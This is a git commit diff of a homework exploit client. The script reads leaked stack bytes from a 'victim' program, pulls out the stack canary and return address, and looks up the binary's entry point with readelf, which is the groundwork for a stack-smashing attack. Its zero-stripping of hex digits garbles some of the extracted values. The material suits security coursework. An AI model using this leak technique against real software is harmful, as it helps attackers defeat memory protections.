5a71ef973cb6cb929d0eecd3d0f526c0062f7f27
Devharsh Trivedi <devharsh@live.in>
2020-12-01 13:51:02 -0500

    modified client.py

--- HW3/assignment_files/client.py
+++ HW3/assignment_files/client.py
@@ -9,14 +9,30 @@ s.send(str)
 data = s.recv(1024)
 s.close()
 
+canary = ''
+ret_addr = ''
 valuebyte = ''
+
 for i in range(48):
-	valuebyte += hex(ord(data[i])) + '\t'
+	this_byte = hex(ord(data[i]))
+	if len(this_byte) == 3:
+		this_byte = '0x0' + this_byte[2]
+	valuebyte += this_byte + '\t'
+	if i>23 and i<32:
+		canary += this_byte.strip('0x')
+	if i>39 and i<48:
+		ret_addr += this_byte.strip('0x')
 	if (i+1)%8 == 0:
 		print(valuebyte)
 		valuebyte = ''
 
+os.system('readelf -a victim | grep -i "entry" > tmp')
+binadd = open('tmp', 'r').read()
+binadd = binadd.split(':')
+print(binadd[1].strip())
+
+write_to_file = '0x' + canary[::-1] + '\t0x' + ret_addr[::-1] + '\t' + binadd[1].strip() + '\n'
+
 filename = '/tmp/someData.txt'
 with open(filename, 'w') as file_object:
-    file_object.write(repr(data))
-    file_object.write("\n")
+    file_object.write(write_to_file)
